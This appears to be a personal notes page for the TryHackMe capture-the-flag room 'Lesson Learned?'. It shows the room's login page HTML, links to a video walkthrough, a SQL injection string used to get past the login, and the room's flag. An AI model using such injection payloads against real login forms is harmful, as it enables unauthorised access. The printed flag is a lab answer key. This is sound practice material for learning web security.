### 26082023Sat

[TryHackMe | Lesson Learned?](https://tryhackme.com/room/lessonlearned)

```
Have you learned your lesson?
```

![[Pasted image 20230826174902.png]]
![[Pasted image 20230826174951.png]]
![[Pasted image 20230826175037.png]]

```
<html>
<head>
<title>Lesson Learned?</title>
<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet" type="text/css">
<style type="text/css">
html, body {background:#5A5A5A;font-family:'Source Sans Pro',sans-serif;}
#login {position:absolute;background:#D3D3D3;top:25%;left:50%;padding:20px;transform:translate(-50%,-25%);}
#success {position:absolute;background:#53a653;top:25%;left:50%;padding:20px;transform:translate(-50%,-25%);}
#error {position:absolute;background:#D0342C;width:800px;top:25%;left:50%;padding:20px;transform:translate(-50%,-25%);color:#fff;font-weight:bold;font-size:1.5em;}
.highlight {font-weight:bold;background:yellow;color:black;padding:0 0.3em}
.code {font-family:courier}
h1 {text-align:center;margin-top:0px;}
small {font-size:0.5em}
form {display:grid;grid-template-columns:80px 1fr;grid-gap:16px;}
label {grid-column:1/2;text-align:right;}
input {grid-column:2/3;}
</style>
</head>
<body>
<div id="login">
<h1>Login</h1>
<form action="/" method="POST">
<label for="username">Username</label>
<input id="username" type="text" name="username"/>
<label for="password">Password</label>
<input id="password" type="password" name="password"/>
<input type="submit" value="Login"/>
</form>
</div>
</body>
</html>
```

[Lesson Learned? - TryHackMe CTF Walk Through -](https://youtu.be/tf560Q6n158?t=384)

https://www.youtube.com/@djalilayed

```
1' UNION SELECT null-- -
```

![[Pasted image 20230826183137.png]]

```
THM{aab02c6b76bb752456a54c80c2d6fb1e}
```

![[Pasted image 20230826182624.png]]